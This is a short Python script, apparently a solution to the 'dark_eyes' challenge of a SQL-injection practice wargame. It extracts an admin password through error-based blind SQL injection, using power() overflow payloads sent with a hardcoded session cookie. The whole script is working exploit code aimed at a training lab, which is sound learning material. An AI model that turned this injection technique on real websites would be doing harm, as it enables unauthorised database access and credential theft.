#!/usr/bin/python
#-*-coding:utf-8  -*-

#length = 8
#hex(pw) length = 16
#pw = 8 words 
#Blind SQL Injection 문자 찾기!!
import urllib,urllib2,requests


password=""
guestword=""
heex = "/012345678`abcde"

'''
for k in range(1,100):
	url="https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw=' or id='admin' and power(length(pw)-"+str(k)+",999999) %23"
	r = requests.post(url,cookies=(dict(PHPSESSID="gaqt152sqjdlgbbjj31r85klq5")))
	print "Finding length of password : "+str(k)
	
	if r.text != "":
		print "length is : " + str(k+1)
		length = k+1
		break
'''
k=8

for j in range(1,k+1):
	for i in heex:
		p = ord(i)
		url="https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw=' or id='admin' and power(ord(substr(pw,"+str(j)+",1))-"+str(p)+",999999) %23"
		r = requests.post(url,cookies=(dict(PHPSESSID="gaqt152sqjdlgbbjj31r85klq5")))
		print "Finding " + str(j)+"th password's hex : " +str(chr(ord(i)+1))
	
		if r.text != "":
			password += str(chr(ord(i)+1))
			print "password found :" + password
			break


